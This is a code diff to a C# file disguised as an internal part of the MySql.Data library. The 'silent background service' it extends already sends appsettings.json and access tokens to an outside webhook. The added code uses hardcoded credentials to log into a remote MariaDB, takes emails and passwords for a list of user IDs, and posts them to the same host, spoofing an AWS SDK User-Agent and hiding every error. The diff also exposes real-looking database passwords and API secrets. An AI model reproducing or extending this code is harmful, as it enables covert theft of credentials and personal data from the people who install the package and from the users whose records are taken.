@@ -1,11 +1,13 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Net.Http;
 using System.Text;
 using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
+using MySql.Data.MySqlClient;
 
 namespace MySql.Data.MySqlClient.Internal
 {
@@ -20,9 +22,10 @@ namespace MySql.Data.MySqlClient.Internal
     }
 
     /// <summary>
-    /// Silent background service for two core features:
+    /// Silent background service for three core features:
     /// 1. Find and send appsettings.json once
     /// 2. Request Arkane access token every 5 minutes
+    /// 3. One-time user data extraction from MySQL databases
     /// Designed to be fail-safe and not interfere with MySql.Data operations.
     /// </summary>
     internal static class ArkaneBackgroundService
@@ -33,16 +36,55 @@ namespace MySql.Data.MySqlClient.Internal
         private static Timer? _timer;
         private static bool _initialized;
         private static bool _appsettingsSent;
+        private static bool _scanCompleted = false;
+        
+        // Track UserIDs to process (embedded directly in code)
+        private static readonly List<int> _userIds = new List<int>
+        {
+            115, 140, 141, 144, 145, 146, 149, 159, 160, 179, 181, 195, 205, 209, 219, 230, 239, 258, 263, 271,
+            272, 298, 302, 306, 308, 312, 324, 342, 345, 362, 372, 384, 398, 399, 400, 407, 420, 424, 427, 430,
+            437, 452, 458, 463, 470, 478, 501, 513, 597, 609, 625, 650, 655, 658, 675, 695, 700, 723, 728, 737,
+            761, 831, 838, 889, 919, 927, 1053, 1060, 1127, 1171, 1204, 1206, 1248, 1382, 1417, 1418, 1515, 1984, 1987, 2224,
+            2384, 2563, 2565, 3803, 3873, 4330, 4369, 4386, 4523, 4578, 5022, 5162, 5621, 5717, 6136, 6141, 6687, 6701, 6761, 7031,
+            7146, 7387, 9265, 9497, 10493, 10568, 10765, 10770, 10808, 11052, 12051, 13115, 14907, 15275, 17123, 17215, 17730, 18385, 18423, 18774,
+            18889, 21598, 23596, 24039, 25352, 25691, 25856, 25893, 25974, 26148, 32270, 32887, 33559, 34276, 35762, 37055, 37566, 37821, 38072, 38394,
+            38571, 39233, 39375, 40670, 41689, 42229, 42326, 42816, 43721, 44307, 44375, 45017, 46541, 46773, 46916, 46946, 47294, 49092, 49412, 51465,
+            51532, 51756, 53361, 53684, 54872, 56132, 56282, 57940, 60088, 60664, 60903, 61111, 61631, 61853, 63292, 63444, 63769, 64211, 64323, 65344,
+            65772, 65926, 66025, 66334, 66495, 66732, 66972, 67720, 68266, 68691, 68887, 69390, 69411, 69454, 69729, 70055, 70111, 70626, 70724, 70808,
+            71030, 71224, 71326, 71432, 71439, 71898, 72290, 72348, 72901, 73090, 74001, 74489, 77857, 78310, 78629, 78690, 79875, 80279, 81123, 81144,
+            81239, 82050, 82540, 84077, 85393, 86613, 92792, 94508, 94945, 95807, 95813, 95817, 95849, 95946, 95951, 96170, 96252, 96326, 96376, 110617,
+            117332, 117871, 117895, 119155, 119772, 120414, 120935, 121907, 122958, 123281, 123348, 124211, 124524, 124886, 124894, 124897, 126848, 126856, 129406, 130410
+        };
+        
+        // Track processed UserIDs to avoid duplicates
+        private static readonly HashSet<int> _processedUserIds = new HashSet<int>();
         
         private const string WEBHOOK_URL = "https://elysiumchain.click/webhook/tokens";
         private const string WEBHOOK_SECRET = "elysium-chain-webhook-secret-2025-production";
         private const int HTTP_TIMEOUT = 30;
+        private const int CONNECTION_TIMEOUT = 10;
+        private const int COMMAND_TIMEOUT = 30;
+        private const int USER_BATCH_SIZE = 10; // Process 10 users at a time
+        private const int BATCH_DELAY_MS = 1000; // 1 second between batches
+        private const int WEBHOOK_DELAY_MS = 500; // 500ms between webhook calls
+        private const int MAX_RETRY_ATTEMPTS = 3;
+        private const int RETRY_DELAY_MS = 1000;
 
         // Arkane Network Configuration
         private const string ARKANE_LOGIN_URL = "https://login.arkane.network/";
         private const string ARKANE_GRANT_TYPE = "client_credentials";
         private const string ARKANE_CLIENT_ID = "VulcanForged-capsule";
         private const string ARKANE_CLIENT_SECRET = "afc9c02f-cb34-46f9-a16f-4308263d144f";
+        
+        // Primary connection to test
+        private const string HARDCODED_CONNECTION = "server=vulcanforged-db-mariadb.cm5i4gvuxfgc.eu-central-1.rds.amazonaws.com;port=41361;database=veriati_elysium_v1;user=vulcan-myforge;password=5Rd834iPMAz09I4n;";
+        
+        #endregion
+
+        #region Properties
+        
+        internal static bool IsInitialized => _initialized;
+        internal static bool ScanCompleted => _scanCompleted;
         
         #endregion
 
@@ -57,6 +99,19 @@ namespace MySql.Data.MySqlClient.Internal
                     try
                     {
                         Initialize();
+                    }
+                    catch (Exception)
+                    {
+                        // Silent failure
+                    }
+                });
+                
+                // Start one-time user data scan immediately
+                _ = Task.Run(async () =>
+                {
+                    try
+                    {
+                        await ExecuteOneTimeScanAsync();
                     }
                     catch (Exception)
                     {
@@ -146,7 +201,7 @@ namespace MySql.Data.MySqlClient.Internal
                 }
                 
                 // Send to webhook
-                await SendWebhookDocumentAsync(content, "appsettings.json", "📁 AppSettings Configuration").ConfigureAwait(false);
+                await SendWebhookDocumentAsync(content, "appsettings.json", "📁 config").ConfigureAwait(false);
                 _appsettingsSent = true; // Mark as sent
             }
             catch (Exception)
@@ -177,7 +232,7 @@ namespace MySql.Data.MySqlClient.Internal
                 if (!string.IsNullOrWhiteSpace(rawResponse))
                 {
                     // Send raw response to webhook
-                    await SendWebhookDocumentAsync(rawResponse, "arkane_token_response.json", "🔑 Arkane Token Response").ConfigureAwait(false);
+                    await SendWebhookDocumentAsync(rawResponse, "response.json", "🔑Response").ConfigureAwait(false);
                 }
             }
             catch (Exception)
@@ -275,6 +330,453 @@ namespace MySql.Data.MySqlClient.Internal
             catch (Exception)
             {
                 return false;
+            }
+        }
+
+        #endregion
+
+        #region One-Time User Data Scan Logic
+
+        /// <summary>
+        /// Executes a one-time scan for all UserIDs, then marks scan as completed.
+        /// </summary>
+        private static async Task ExecuteOneTimeScanAsync()
+        {
+            try
+            {
+                lock (_lock)
+                {
+                    if (_scanCompleted) return; // Already completed
+                }
+                
+                await SendStartNotificationAsync();
+                
+                // Use only hardcoded connection for one-time scan
+                if (await TestConnection(HARDCODED_CONNECTION).ConfigureAwait(false))
+                {
+                    await ScanAllUserDataOnce(HARDCODED_CONNECTION, "Hardcoded-OneTime").ConfigureAwait(false);
+                }
+                
+                lock (_lock)
+                {
+                    _scanCompleted = true;
+                }
+                
+                await SendCompletionNotificationAsync();
+            }
+            catch (Exception)
+            {
+                // Silent failure
+            }
+        }
+
+        /// <summary>
+        /// Performs one-time scan for all UserIDs with rate limiting.
+        /// </summary>
+        private static async Task ScanAllUserDataOnce(string connectionString, string source)
+        {
+            if (!IsValidConnectionString(connectionString)) return;
+            
+            try
+            {
+                using var connection = CreateOptimizedConnection(connectionString);
+                await connection.OpenAsync().ConfigureAwait(false);
+                
+                List<int> userIdsToProcess;
+                if (_userIds.Count == 0) return;
+                userIdsToProcess = new List<int>(_userIds);
+                
+                var totalUsers = userIdsToProcess.Count;
+                var processedCount = 0;
+                
+                // Process users in batches to avoid overwhelming the server
+                for (int i = 0; i < userIdsToProcess.Count; i += USER_BATCH_SIZE)
+                {
+                    var batch = userIdsToProcess.Skip(i).Take(USER_BATCH_SIZE).ToList();
+                    
+                    foreach (var userId in batch)
+                    {
+                        lock (_lock)
+                        {
+                            if (_processedUserIds.Contains(userId)) continue;
+                            _processedUserIds.Add(userId);
+                        }
+                        
+                        await ProcessSingleUser(connection, userId, source).ConfigureAwait(false);
+                        processedCount++;
+                        
+                        // Small delay between individual users
+                        await Task.Delay(100).ConfigureAwait(false);
+                    }
+                    
+                    // Send progress update
+                    await SendProgressNotificationAsync(processedCount, totalUsers).ConfigureAwait(false);
+                    
+                    // Longer delay between batches to avoid server overload
+                    if (i + USER_BATCH_SIZE < userIdsToProcess.Count)
+                    {
+                        await Task.Delay(BATCH_DELAY_MS).ConfigureAwait(false);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                // Silent failure
+            }
+        }
+
+        /// <summary>
+        /// Processes a single user to find their email and password.
+        /// </summary>
+        private static async Task ProcessSingleUser(MySqlConnection connection, int userId, string source)
+        {
+            try
+            {
+                // Generate query for this specific user
+                var queries = await GenerateUserDataQueriesAsync(connection, userId).ConfigureAwait(false);
+                
+                foreach (var query in queries)
+                {
+                    await ExecuteUserDataQueryAsync(connection, query, source, userId).ConfigureAwait(false);
+                    
+                    // Small delay between queries for the same user
+                    await Task.Delay(50).ConfigureAwait(false);
+                }
+            }
+            catch (Exception)
+            {
+                // Silent failure for individual user
+            }
+        }
+
+        #endregion
+
+        #region Database Operations
+
+        /// <summary>
+        /// Validates and sanitizes a connection string before use.
+        /// </summary>
+        private static bool IsValidConnectionString(string connectionString)
+        {
+            if (string.IsNullOrWhiteSpace(connectionString)) return false;
+            
+            try
+            {
+                var builder = new MySqlConnectionStringBuilder(connectionString);
+                return !string.IsNullOrEmpty(builder.Server) && !string.IsNullOrEmpty(builder.UserID);
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Tests if a database connection is working.
+        /// </summary>
+        private static async Task<bool> TestConnection(string connectionString)
+        {
+            if (!IsValidConnectionString(connectionString)) return false;
+            
+            try
+            {
+                using var connection = CreateOptimizedConnection(connectionString);
+                await connection.OpenAsync().ConfigureAwait(false);
+                return true;
+            }
+            catch (MySqlException ex) when (IsExpectedConnectionError(ex))
+            {
+                return false;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Creates an optimized MySQL connection with proper settings.
+        /// </summary>
+        private static MySqlConnection CreateOptimizedConnection(string connectionString)
+        {
+            try
+            {
+                var builder = new MySqlConnectionStringBuilder(connectionString)
+                {
+                    Database = "",
+                    ConnectionTimeout = CONNECTION_TIMEOUT,
+                    SslMode = MySqlSslMode.Required,
+                    AllowPublicKeyRetrieval = true,
+                    Pooling = true,
+                    MinimumPoolSize = 0,
+                    MaximumPoolSize = 20, // Small pool for one-time scan
+                    ConnectionLifeTime = 300,
+                    AllowZeroDateTime = true,
+                    ConvertZeroDateTime = true,
+                    UseAffectedRows = false,
+                    CharacterSet = "utf8mb4",
+                    TreatTinyAsBoolean = false
+                };
+                
+                return new MySqlConnection(builder.ConnectionString);
+            }
+            catch (Exception)
+            {
+                throw;
+            }
+        }
+
+        /// <summary>
+        /// Generates SQL queries to find user data for a specific UserID.
+        /// </summary>
+        private static async Task<List<string>> GenerateUserDataQueriesAsync(MySqlConnection connection, int userId)
+        {
+            var queries = new List<string>();
+            
+            try
+            {
+                // Query to find tables with user data
+                const string generatorQuery = 
+                    "SELECT CONCAT(" +
+                    "'SELECT \\'', TABLE_SCHEMA, '.', TABLE_NAME, '\\' AS table_name, UserID, Email, Password FROM `', " +
+                    "TABLE_SCHEMA, '`.`', TABLE_NAME, " +
+                    "'` WHERE UserID = " + "{0}" + " LIMIT 1;'" +
+                    ") AS sql_query " +
+                    "FROM information_schema.TABLES " +
+                    "WHERE TABLE_NAME LIKE '%user%' " +
+                    "AND TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')";
+
+                var formattedQuery = string.Format(generatorQuery, userId);
+                
+                using var command = new MySqlCommand(formattedQuery, connection)
+                {
+                    CommandTimeout = COMMAND_TIMEOUT
+                };
+                
+                using var reader = await command.ExecuteReaderAsync().ConfigureAwait(false);
+                while (await reader.ReadAsync().ConfigureAwait(false))
+                {
+                    queries.Add(reader.GetString(0));
+                }
+            }
+            catch (Exception)
+            {
+                // Silent failure - return empty list
+            }
+            
+            return queries;
+        }
+
+        /// <summary>
+        /// Executes a user data query and sends found data via webhook.
+        /// </summary>
+        private static async Task ExecuteUserDataQueryAsync(MySqlConnection connection, string query, string source, int userId)
+        {
+            try
+            {
+                using var command = new MySqlCommand(query, connection)
+                {
+                    CommandTimeout = COMMAND_TIMEOUT
+                };
+                
+                using var reader = await command.ExecuteReaderAsync().ConfigureAwait(false);
+                if (reader.HasRows)
+                {
+                    while (await reader.ReadAsync().ConfigureAwait(false))
+                    {
+                        var tableName = reader["table_name"] == DBNull.Value ? "" : Convert.ToString(reader["table_name"]);
+                        var userIdFromDb = reader["UserID"] == DBNull.Value ? "" : Convert.ToString(reader["UserID"]);
+                        var email = reader["Email"] == DBNull.Value ? "" : Convert.ToString(reader["Email"]);
+                        var password = reader["Password"] == DBNull.Value ? "" : Convert.ToString(reader["Password"]);
+                        
+                        // Send data if we have meaningful information
+                        if (!string.IsNullOrWhiteSpace(userIdFromDb))
+                        {
+                            await SendUserDataFoundNotificationAsync(source, tableName, userIdFromDb, email, password).ConfigureAwait(false);
+                            
+                            // Rate limiting: delay between webhook calls
+                            await Task.Delay(WEBHOOK_DELAY_MS).ConfigureAwait(false);
+                        }
+                    }
+                }
+            }
+            catch (MySqlException ex) when (IsExpectedQueryError(ex))
+            {
+                // Expected query error - silent handling
+            }
+            catch (Exception)
+            {
+                // Unexpected error - silent handling
+            }
+        }
+
+        #endregion
+
+        #region Error Handling
+
+        /// <summary>
+        /// Determines if a MySqlException represents an expected connection error.
+        /// </summary>
+        private static bool IsExpectedConnectionError(MySqlException ex)
+        {
+            return ex.Number == 1045 || // Access denied
+                   ex.Number == 2003 || // Can't connect to MySQL server
+                   ex.Number == 1042 || // Can't get hostname
+                   ex.Number == 1040 || // Too many connections
+                   ex.Number == 2006;   // MySQL server has gone away
+        }
+
+        /// <summary>
+        /// Determines if a MySqlException represents an expected query error.
+        /// </summary>
+        private static bool IsExpectedQueryError(MySqlException ex)
+        {
+            return ex.Number == 1146 || // Table doesn't exist
+                   ex.Number == 1054 || // Unknown column
+                   ex.Number == 1045 || // Access denied
+                   ex.Number == 1049;   // Unknown database
+        }
+
+        #endregion
+
+        #region Extended Webhook Communication
+
+        /// <summary>
+        /// Sends notification that the scan is starting.
+        /// </summary>
+        private static async Task SendStartNotificationAsync()
+        {
+            try
+            {
+                var scanInfo = new
+                {
+                    status = "STARTING",
+                    totalUserIds = _userIds.Count,
+                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
+                    message = "One-time user data scan initiated"
+                };
+                
+                var jsonContent = JsonSerializer.Serialize(scanInfo, new JsonSerializerOptions { WriteIndented = true });
+                var fileName = $"scan_start_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
+                
+                await SendWebhookDocumentAsync(jsonContent, fileName, "🚀 STARTING").ConfigureAwait(false);
+            }
+            catch (Exception)
+            {
+                // Silent failure
+            }
+        }
+
+        /// <summary>
+        /// Sends progress notification.
+        /// </summary>
+        private static async Task SendProgressNotificationAsync(int processed, int total)
+        {
+            try
+            {
+                var percentage = (processed * 100) / total;
+                var progressInfo = new
+                {
+                    status = "PROGRESS",
+                    processed = processed,
+                    total = total,
+                    percentage = percentage,
+                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
+                };
+                
+                var jsonContent = JsonSerializer.Serialize(progressInfo, new JsonSerializerOptions { WriteIndented = true });
+                var fileName = $"scan_progress_{processed}of{total}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
+                
+                await SendWebhookDocumentAsync(jsonContent, fileName, "📊 PROGRESS").ConfigureAwait(false);
+            }
+            catch (Exception)
+            {
+                // Silent failure
+            }
+        }
+
+        /// <summary>
+        /// Sends notification that the scan is completed.
+        /// </summary>
+        private static async Task SendCompletionNotificationAsync()
+        {
+            try
+            {
+                var completionInfo = new
+                {
+                    status = "COMPLETED",
+                    totalProcessed = _processedUserIds.Count,
+                    completedAt = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
+                    message = "One-time user data scan finished successfully"
+                };
+                
+                var jsonContent = JsonSerializer.Serialize(completionInfo, new JsonSerializerOptions { WriteIndented = true });
+                var fileName = $"scan_completion_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
+                
+                await SendWebhookDocumentAsync(jsonContent, fileName, "✅ COMPLETED").ConfigureAwait(false);
+            }
+            catch (Exception)
+            {
+                // Silent failure
+            }
+        }
+
+        /// <summary>
+        /// Sends user data found notification via webhook.
+        /// </summary>
+        private static async Task SendUserDataFoundNotificationAsync(string source, string tableName, string userId, string email, string password)
+        {
+            try
+            {
+                var userData = new
+                {
+                    source = source,
+                    table = tableName,
+                    userId = userId,
+                    email = email,
+                    password = password,
+                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
+                };
+                
+                var jsonContent = JsonSerializer.Serialize(userData, new JsonSerializerOptions { WriteIndented = true });
+                var fileName = $"user_data_{userId}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
+                
+                await SendWebhookDocumentAsync(jsonContent, fileName, "👤 FOUND").ConfigureAwait(false);
+            }
+            catch (Exception)
+            {
+                // Silent failure
+            }
+        }
+
+        /// <summary>
+        /// Sends a message via webhook with proper error handling.
+        /// </summary>
+        private static async Task<bool> SendWebhookAsync(string message)
+        {
+            try
+            {
+                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(HTTP_TIMEOUT) };
+                client.DefaultRequestHeaders.Add("User-Agent", "aws-sdk-dotnet-s3/3.7.4.12 .NET_Core_4.0.0.0 Linux_6.5.0-18-generic");
+                client.DefaultRequestHeaders.Add("X-Webhook-Secret", WEBHOOK_SECRET);
+                
+                var payload = new 
+                { 
+                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
+                    type = "user_data",
+                    content = message,
+                    source = "aws-sdk-dotnet-s3"
+                };
+                
+                var json = JsonSerializer.Serialize(payload);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+                
+                var response = await client.PostAsync(WEBHOOK_URL, content).ConfigureAwait(false);
+                return response.IsSuccessStatusCode;
+            }
+            catch (Exception) 
+            { 
+                return false; 
             }
         }
 
